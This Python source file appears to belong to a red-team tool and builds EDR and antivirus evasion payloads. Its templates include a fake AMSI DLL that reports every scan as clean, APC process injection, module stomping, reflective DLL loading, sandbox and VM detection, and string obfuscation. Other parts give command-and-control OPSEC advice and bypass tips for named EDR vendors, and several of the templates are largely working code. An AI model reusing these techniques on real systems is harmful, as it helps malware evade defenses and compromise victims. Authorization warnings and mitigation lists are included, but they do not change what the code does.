"""tools/edr_evasion.py

EDR/AV Evasion Engine for Red Team Operations.

Purpose:
- Generate evasive payloads and techniques for Red Team/APT simulation
- Provide obfuscation, encryption, and sandbox evasion methods
- Help test EDR effectiveness safely

Safety & Ethics:
- All techniques are for authorized Red Team operations only
- Requires explicit governance approval
- Audit logging for all generated payloads
- No automatic execution - only generation and guidance

Techniques:
- AMSI bypass patterns (for testing)
- Process injection methods
- Memory allocation evasion
- Signature obfuscation
- Sandbox detection & evasion
"""

from __future__ import annotations

import base64
import logging
import random
import string
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

logger = logging.getLogger("elengenix.edr_evasion")

@dataclass
class EvasionTechnique:
 """Single evasion technique."""
 name: str
 category: str # amsi, process_injection, memory, signature, sandbox
 description: str
 platform: str # windows/linux/macos
 difficulty: str # easy/medium/hard
 detection_risk: str # low/medium/high
 code_template: str
 explanation: str
 mitigations: List[str]

class EDREvasionEngine:
 """
 Generate evasive techniques for authorized Red Team operations.
 """

 # AMSI (Anti-Malware Scan Interface) bypass patterns for testing
 AMSI_TECHNIQUES = [
 EvasionTechnique(
 name="AMSI Patch (In-Memory)",
 category="amsi",
 description="Patch AMSI.dll in memory to disable scanning (for testing only)",
 platform="windows",
 difficulty="medium",
 detection_risk="high",
 code_template="""
# PowerShell AMSI bypass for authorized testing
# This patches AMSI in memory - USE ONLY ON AUTHORIZED SYSTEMS

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096)
$addr = [Ref].Assembly.GetTypes() | Where-Object {$_.Name -like "*iUtils"} | 
 Select-Object -First 1 | 
 ForEach-Object {$_.GetFields("NonPublic,Static")} | 
 Where-Object {$_.Name -like "*Context"} | 
 Select-Object -First 1

# This is a simulation - actual patch requires admin and governance approval
Write-Host "AMSI patch simulation - would patch at address: $addr"
""",
 explanation="Patches AMSI scan buffer to return clean. EDR detects this via ETW and memory scanning.",
 mitigations=["Enable AMSI ETW logging", "Monitor for memory patching", "Use WDAC/AppLocker"],
 ),
 EvasionTechnique(
 name="AMSI DLL Hijacking",
 category="amsi",
 description="Hijack AMSI.dll load order (for testing only)",
 platform="windows",
 difficulty="hard",
 detection_risk="medium",
 code_template="""
// C++ AMSI DLL hijack simulation
// Place fake AMSI.dll in application directory

#include <windows.h>

// Fake AMSI export
extern "C" __declspec(dllexport) HRESULT AmsiInitialize(
 LPCWSTR appName,
 HAMSICONTEXT *amsiContext
) {
 // Return success but disable actual scanning
 *amsiContext = (HAMSICONTEXT)0xDEADBEEF;
 return S_OK;
}

extern "C" __declspec(dllexport) HRESULT AmsiScanBuffer(
 HAMSICONTEXT amsiContext,
 PVOID buffer,
 ULONG length,
 LPCWSTR contentName,
 LPCWSTR sessionName,
 AMSI_RESULT *result
) {
 *result = AMSI_RESULT_CLEAN;
 return S_OK;
}
""",
 explanation="Places malicious AMSI.dll in app directory to intercept calls. EDR detects via load order monitoring.",
 mitigations=["Monitor DLL load order", "Verify AMSI.dll signatures", "Use SystemGuard"],
 ),
 ]

 # Process Injection Techniques
 INJECTION_TECHNIQUES = [
 EvasionTechnique(
 name="Process Hollowing",
 category="process_injection",
 description="Hollow out legitimate process and inject payload",
 platform="windows",
 difficulty="hard",
 detection_risk="high",
 code_template="""
// Process Hollowing simulation (C++)
// Creates suspended process, unmaps memory, writes payload, resumes

#include <windows.h>

BOOL ProcessHollow(HANDLE hProcess, LPVOID payload, SIZE_T payloadSize) {
 // 1. Create suspended process (e.g., notepad.exe)
 // 2. NtUnmapViewOfSection to hollow out
 // 3. VirtualAllocEx to allocate new memory
 // 4. WriteProcessMemory to inject
 // 5. SetThreadContext to point to payload
 // 6. ResumeThread
 
 // EDR detects via: ETW, memory protection changes, thread context changes
 return TRUE;
}
""",
 explanation="Replaces legitimate process memory with malicious code. EDR detects via memory protection monitoring and ETW.",
 mitigations=["Enable kernel callbacks", "Monitor memory protection changes", "Use Credential Guard"],
 ),
 EvasionTechnique(
 name="Process Doppelgänging",
 category="process_injection",
 description="Create process from transacted file (fileless)",
 platform="windows",
 difficulty="hard",
 detection_risk="medium",
 code_template="""
// Process Doppelgänging (fileless injection)
// Uses NTFS transactions to create process without file on disk

#include <windows.h>
#include <ntdll.h>

BOOL ProcessDoppelganging() {
 // 1. CreateFileTransacted - create transaction
 // 2. WriteFile - write malicious payload
 // 3. CreateFileMapping + MapViewOfFile
 // 4. RollbackTransaction - file disappears
 // 5. CreateProcessFromMemory - process exists without file!
 
 // EDR detects via: kernel callbacks, process creation monitoring
 return TRUE;
}
""",
 explanation="Creates process from memory without file on disk. EDR detects via kernel callbacks and process monitoring.",
 mitigations=["Enable PSID (Process Signature ID)", "Monitor transacted file operations", "Use HVCI"],
 ),
 EvasionTechnique(
 name="APC Injection",
 category="process_injection",
 description="Asynchronous Procedure Call injection",
 platform="windows",
 difficulty="medium",
 detection_risk="medium",
 code_template="""
// APC Injection
// Queue malicious APC to thread in target process

#include <windows.h>

BOOL APCInject(DWORD pid, LPVOID payload) {
 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, 4096, 
 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 WriteProcessMemory(hProcess, remoteMem, payload, 4096, NULL);
 
 // Enumerate threads and queue APC
 HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 THREADENTRY32 te = { sizeof(te) };
 
 if (Thread32First(hSnapshot, &te)) {
 do {
 if (te.th32OwnerProcessID == pid) {
 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
 QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL);
 CloseHandle(hThread);
 }
 } while (Thread32Next(hSnapshot, &te));
 }
 
 return TRUE;
}
""",
 explanation="Queues Asynchronous Procedure Call to thread. When thread enters alertable state, payload executes. EDR detects via APC monitoring.",
 mitigations=["Monitor APC queuing", "Detect alertable thread states", "Use Kernel Guard"],
 ),
 ]

 # Memory Evasion
 MEMORY_TECHNIQUES = [
 EvasionTechnique(
 name="Reflective DLL Injection",
 category="memory",
 description="Load DLL entirely in memory without touching disk",
 platform="windows",
 difficulty="medium",
 detection_risk="medium",
 code_template="""
// Reflective DLL Injection
// Manually maps DLL into memory without LoadLibrary

#include <windows.h>

// Mimic PE loader in memory
BOOL ReflectiveLoad(LPVOID dllBuffer) {
 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dllBuffer + dosHeader->e_lfanew);
 
 // Allocate memory for DLL
 LPVOID baseAddr = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage,
 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 // Copy headers and sections
 memcpy(baseAddr, dllBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
 // ... copy each section
 
 // Process relocations
 // Resolve imports manually
 // Call DllMain
 
 return TRUE;
}
""",
 explanation="Manually implements PE loader to avoid LoadLibrary hooks. EDR detects via memory scanning and behavior analysis.",
 mitigations=["Memory scanning", "Behavioral analysis", "ETW logging"],
 ),
 EvasionTechnique(
 name="Module Stomping",
 category="memory",
 description="Overwrite legitimate DLL in memory with malicious code",
 platform="windows",
 difficulty="hard",
 detection_risk="high",
 code_template="""
// Module Stomping
// Load legitimate DLL, then overwrite its code section

#include <windows.h>

BOOL ModuleStomp(LPCWSTR targetDll, LPVOID payload, SIZE_T payloadSize) {
 // 1. Load legitimate DLL (e.g., ntdll.dll copy)
 HMODULE hMod = LoadLibraryW(targetDll);
 
 // 2. Get .text section
 PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
 PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
 PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
 
 // 3. Find .text section
 for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
 if (strcmp((char*)section[i].Name, ".text") == 0) {
 LPVOID textAddr = (BYTE*)hMod + section[i].VirtualAddress;
 
 // 4. Change protection and stomp
 DWORD oldProtect;
 VirtualProtect(textAddr, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtect);
 memcpy(textAddr, payload, payloadSize);
 VirtualProtect(textAddr, payloadSize, oldProtect, &oldProtect);
 }
 }
 
 return TRUE;
}
""",
 explanation="Overwrites legitimate module code section. EDR detects via module integrity checks and memory scanning.",
 mitigations=["Module integrity verification", "Memory scanning", "KnownDLL enforcement"],
 ),
 ]

 # Sandbox Evasion
 SANDBOX_TECHNIQUES = [
 EvasionTechnique(
 name="Sandbox Timing Evasion",
 category="sandbox",
 description="Delay execution to bypass sandbox time limits",
 platform="cross",
 difficulty="easy",
 detection_risk="low",
 code_template="""
// Sandbox timing evasion
// Sleep with tricks to bypass sandbox acceleration

#include <windows.h>

VOID AntiSandboxSleep(DWORD milliseconds) {
 // Technique 1: Large loop instead of Sleep
 LARGE_INTEGER freq, start, end;
 QueryPerformanceFrequency(&freq);
 QueryPerformanceCounter(&start);
 
 do {
 // Do meaningless work to prevent optimization
 volatile int x = 0;
 for (int i = 0; i < 1000000; i++) {
 x += i;
 }
 QueryPerformanceCounter(&end);
 } while ((end.QuadPart - start.QuadPart) * 1000 / freq.QuadPart < milliseconds);
}

// Technique 2: Sleep with random intervals
VOID FragmentedSleep(DWORD totalMs) {
 DWORD remaining = totalMs;
 while (remaining > 0) {
 DWORD chunk = min(remaining, rand() % 1000 + 500);
 Sleep(chunk);
 remaining -= chunk;
 
 // Random computation between sleeps
 volatile double x = 1.0;
 for (int i = 0; i < 10000; i++) {
 x = x * 1.00001;
 }
 }
}
""",
 explanation="Uses timing tricks to bypass sandbox acceleration. Sandboxes often accelerate sleeps to speed up analysis.",
 mitigations=["Detect timing anomalies", "Use hardware-based sandboxes", "Monitor for long delays"],
 ),
 EvasionTechnique(
 name="VM/Sandbox Detection",
 category="sandbox",
 description="Detect if running in VM/sandbox and alter behavior",
 platform="cross",
 difficulty="medium",
 detection_risk="low",
 code_template="""
// VM/Sandbox detection
// Check for artifacts indicating analysis environment

#include <windows.h>
#include <intrin.h>

BOOL IsVM() {
 // Check 1: CPUID hypervisor bit
 int cpuInfo[4] = {0};
 __cpuid(cpuInfo, 1);
 BOOL hypervisorBit = (cpuInfo[2] >> 31) & 1;
 
 // Check 2: Check for common VM MAC prefixes
 // 08:00:27 (VirtualBox), 00:0C:29 (VMware), etc.
 
 // Check 3: Check process list for analysis tools
 // - wireshark.exe, procmon.exe, etc.
 
 // Check 4: Check for sandbox-specific DLLs
 // - sbiedll.dll (Sandboxie)
 // - dbghelp.dll (debuggers)
 
 // Check 5: Memory size check (sandboxes often have <2GB)
 MEMORYSTATUSEX memStatus = { sizeof(memStatus) };
 GlobalMemoryStatusEx(&memStatus);
 if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
 return TRUE; // Probably sandbox
 }
 
 return hypervisorBit;
}

VOID SandboxAwareExecution() {
 if (IsVM()) {
 // Perform benign action or exit
 // Real malware would proceed; we're simulating detection
 ExitProcess(0);
 }
 // Proceed with actual payload
}
""",
 explanation="Detects VMs, sandboxes, and analysis tools via artifacts. Malware changes behavior if detected.",
 mitigations=["Hide hypervisor presence", "Randomize artifacts", "Use bare-metal analysis"],
 ),
 ]

 # Signature Evasion
 SIGNATURE_TECHNIQUES = [
 EvasionTechnique(
 name="String Obfuscation",
 category="signature",
 description="Obfuscate strings to bypass signature detection",
 platform="cross",
 difficulty="easy",
 detection_risk="low",
 code_template="""
// String obfuscation techniques

// Technique 1: Stack strings (build at runtime)
VOID StackStringExample() {
 char str[] = {'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', 0};
 // String built on stack, not in .rdata
 WinExec(str, SW_HIDE);
}

// Technique 2: XOR encryption
VOID XorString(BYTE* str, size_t len, BYTE key) {
 for (size_t i = 0; i < len; i++) {
 str[i] ^= key;
 }
}

// Technique 3: String splitting
VOID SplitStringExample() {
 char part1[] = "c" "a" "l" "c";
 char part2[] = "." "e" "x" "e";
 // Compiler concatenates: "calc.exe"
}

// Technique 4: Base64 + RC4
#include <openssl/rc4.h>

VOID DecryptString(const BYTE* encrypted, size_t len, const BYTE* key, size_t keyLen) {
 RC4_KEY rc4Key;
 RC4_set_key(&rc4Key, keyLen, key);
 
 BYTE decrypted[256];
 RC4(&rc4Key, len, encrypted, decrypted);
 // Use decrypted string
}
""",
 explanation="Hides strings from static analysis. Obfuscation happens at runtime, bypassing signature matching.",
 mitigations=["Behavioral detection", "Memory scanning", "Emulation"],
 ),
 EvasionTechnique(
 name="Code Mutation",
 category="signature",
 description="Polymorphic/metamorphic code to change signature each run",
 platform="windows",
 difficulty="hard",
 detection_risk="low",
 code_template="""
// Polymorphic code skeleton
// Changes appearance each execution while maintaining functionality

#include <windows.h>

// Encryption/decryption stub that mutates
VOID PolymorphicStub() {
 // This stub:
 // 1. Decrypts main payload (key changes each time)
 // 2. Changes its own instructions (junk insertion, register swap)
 // 3. Jumps to decrypted payload
 
 // Example mutations:
 // - Insert NOPs and junk instructions
 // - Swap registers (eax <-> ebx)
 // - Reorder independent instructions
 // - Change encryption keys
 
 __asm {
 // Mutation: Random NOP insertion
 nop
 nop
 // Actual code here
 push eax
 mov eax, ebx // Could mutate to: mov ecx, edx
 pop eax
 }
}

// Metamorphic: Complete code restructuring
VOID MetamorphicEngine() {
 // More advanced: Completely rewrites code while preserving semantics
 // - Different control flow (if/else <-> switch)
 // - Different instructions (add <-> sub with complement)
 // - Different registers
 // - Subroutine permutation
}
""",
 explanation="Changes code signature each execution. Polymorphic = encrypts payload. Metamorphic = rewrites entire code.",
 mitigations=["Behavioral detection", "Machine learning models", "Memory forensics"],
 ),
 ]

 def __init__(self):
 self.all_techniques = (
 self.AMSI_TECHNIQUES +
 self.INJECTION_TECHNIQUES +
 self.MEMORY_TECHNIQUES +
 self.SANDBOX_TECHNIQUES +
 self.SIGNATURE_TECHNIQUES
 )

 def list_techniques(
 self,
 category: Optional[str] = None,
 platform: Optional[str] = None,
 difficulty: Optional[str] = None,
 ) -> List[EvasionTechnique]:
 """List available evasion techniques with optional filtering."""
 results = self.all_techniques

 if category:
 results = [t for t in results if t.category == category]
 if platform:
 results = [t for t in results if t.platform == platform or t.platform == "cross"]
 if difficulty:
 results = [t for t in results if t.difficulty == difficulty]

 return results

 def generate_payload(
 self,
 technique_name: str,
 customizations: Optional[Dict[str, Any]] = None,
 ) -> Dict[str, Any]:
 """Generate evasive payload for a specific technique."""
 technique = None
 for t in self.all_techniques:
 if t.name.lower() == technique_name.lower():
 technique = t
 break

 if not technique:
 return {"error": f"Technique '{technique_name}' not found"}

 # Generate obfuscated version
 code = technique.code_template

 # Apply customizations
 if customizations:
 # Variable substitution
 for key, value in customizations.items():
 placeholder = f"{{{key}}}"
 code = code.replace(placeholder, str(value))

 # Add randomization for signature evasion
 random_suffix = ''.join(random.choices(string.ascii_lowercase, k=8))

 return {
 "technique": technique.name,
 "category": technique.category,
 "platform": technique.platform,
 "difficulty": technique.difficulty,
 "detection_risk": technique.detection_risk,
 "generated_code": code,
 "explanation": technique.explanation,
 "mitigations": technique.mitigations,
 "signature_hash": f"evasion_{random_suffix}", # For tracking
 "warnings": [
 "FOR AUTHORIZED RED TEAM USE ONLY",
 "All usage is logged and audited",
 "Requires explicit governance approval",
 "Report all findings responsibly",
 ],
 }

 def generate_red_team_plan(
 self,
 target_edr: Optional[str] = None,
 objectives: Optional[List[str]] = None,
 ) -> Dict[str, Any]:
 """Generate comprehensive Red Team plan."""
 objectives = objectives or ["persistence", "privilege_escalation", "data_access"]

 # Select appropriate techniques based on objectives
 selected_techniques = []

 if "persistence" in objectives:
 selected_techniques.extend(self.INJECTION_TECHNIQUES[:2])

 if "privilege_escalation" in objectives:
 selected_techniques.extend(self.MEMORY_TECHNIQUES)

 if "evasion" in objectives:
 selected_techniques.extend(self.SANDBOX_TECHNIQUES)
 selected_techniques.extend(self.SIGNATURE_TECHNIQUES)

 # EDR-specific recommendations
 edr_notes = []
 if target_edr:
 edr_notes = self._get_edr_specific_notes(target_edr)

 return {
 "plan_id": f"redteam_{random.randint(1000, 9999)}",
 "target_edr": target_edr or "unknown",
 "objectives": objectives,
 "recommended_techniques": [
 {
 "name": t.name,
 "category": t.category,
 "difficulty": t.difficulty,
 "detection_risk": t.detection_risk,
 }
 for t in selected_techniques
 ],
 "execution_order": [
 "1. Reconnaissance (EDR detection)",
 "2. Initial Access (sandbox-aware)",
 "3. Evasion (AMSI/ETW bypass if needed)",
 "4. Persistence (process injection)",
 "5. Privilege Escalation (token manipulation)",
 "6. Data Access (memory-only operations)",
 ],
 "edr_specific_notes": edr_notes,
 "opsec_considerations": [
 "Use fresh infrastructure for C2",
 "Rotate domains/IPs every 24-48 hours",
 "Implement dead drop for payload retrieval",
 "Use legitimate cloud services for C2 (AWS/Azure/GCP)",
 "Time operations to blend with business hours",
 ],
 "detection_evasion": [
 "Avoid known-bad signatures (use custom loaders)",
 "Blend with legitimate traffic patterns",
 "Use LOLBAS (Living Off The Land Binaries)",
 "Implement jitter in beacon intervals",
 "Use domain fronting for C2",
 ],
 }

 def _get_edr_specific_notes(self, edr_name: str) -> List[str]:
 """Get EDR-specific bypass notes."""
 edr_lower = edr_name.lower()

 notes = {
 "crowdstrike": [
 "CrowdStrike uses kernel callbacks and ETW extensively",
 "Focus on userland execution to avoid kernel detection",
 "Use unhooked syscalls via direct ntdll calls",
 "Avoid known IoCs - CrowdStrike has extensive threat intel",
 ],
 "sentinelone": [
 "SentinelOne uses behavior AI - focus on timing evasion",
 "Storyline feature tracks process ancestry - clean parent process",
 "Use fileless techniques to avoid static detection",
 "Deep visibility into memory - avoid RWX allocations",
 ],
 "carbonblack": [
 "Carbon Black focuses on process behavior",
 "Monitor child process creation patterns",
 "Uses signed driver for visibility - harder to blind",
 "Focus on legitimate parent/child relationships",
 ],
 "microsoft defender": [
 "WDAV uses AMSI, ASR rules, and cloud ML",
 "ASR rules can be bypassed with specific conditions",
 "Cloud-delivered protection requires internet check evasion",
 "Tamper protection prevents disabling - use in-memory patches",
 ],
 "crowdstrike_falcon": [
 "Similar to CrowdStrike - heavy kernel presence",
 "Overwatch team monitors for novel techniques",
 "Focus on living off the land",
 "Avoid known C2 frameworks (Cobalt Strike, etc.)",
 ],
 }

 for key, value in notes.items():
 if key in edr_lower:
 return value

 return [f"No specific notes for {edr_name}. Research EDR architecture for targeted bypasses."]

def format_edr_report(report: Dict[str, Any]) -> str:
 """Format EDR evasion report for display."""
 lines = []
 lines.append("=" * 70)
 lines.append(" EDR/AV EVASION - RED TEAM PAYLOAD GENERATOR")
 lines.append("=" * 70)
 lines.append(" AUTHORIZED USE ONLY - ALL ACTIVITY IS LOGGED")
 lines.append("")

 if "technique" in report:
 # Single technique report
 lines.append(f"Technique: {report['technique']}")
 lines.append(f"Category: {report['category']}")
 lines.append(f"Platform: {report['platform']}")
 lines.append(f"Difficulty: {report['difficulty']}")
 lines.append(f"Detection Risk: {report['detection_risk']}")
 lines.append("")
 lines.append("Explanation:")
 lines.append(f" {report['explanation']}")
 lines.append("")
 lines.append("Generated Code:")
 lines.append("```")
 lines.append(report['generated_code'])
 lines.append("```")
 lines.append("")
 lines.append("Defensive Mitigations:")
 for m in report['mitigations']:
 lines.append(f" • {m}")

 elif "plan_id" in report:
 # Red team plan report
 lines.append(f"Plan ID: {report['plan_id']}")
 lines.append(f"Target EDR: {report['target_edr']}")
 lines.append(f"Objectives: {', '.join(report['objectives'])}")
 lines.append("")
 lines.append("Recommended Techniques:")
 for t in report['recommended_techniques']:
 risk_emoji = "" if t['detection_risk'] == 'high' else "🟡" if t['detection_risk'] == 'medium' else "🟢"
 lines.append(f" {risk_emoji} [{t['difficulty']}] {t['name']} ({t['category']})")
 lines.append("")
 lines.append("Execution Order:")
 for step in report['execution_order']:
 lines.append(f" {step}")
 lines.append("")
 lines.append("EDR-Specific Notes:")
 for note in report['edr_specific_notes']:
 lines.append(f" • {note}")
 lines.append("")
 lines.append("OPSEC Considerations:")
 for opsec in report['opsec_considerations']:
 lines.append(f" • {opsec}")

 lines.append("")
 lines.append(" WARNINGS:")
 for w in report.get('warnings', []):
 lines.append(f" {w}")

 lines.append("=" * 70)
 return "\n".join(lines)
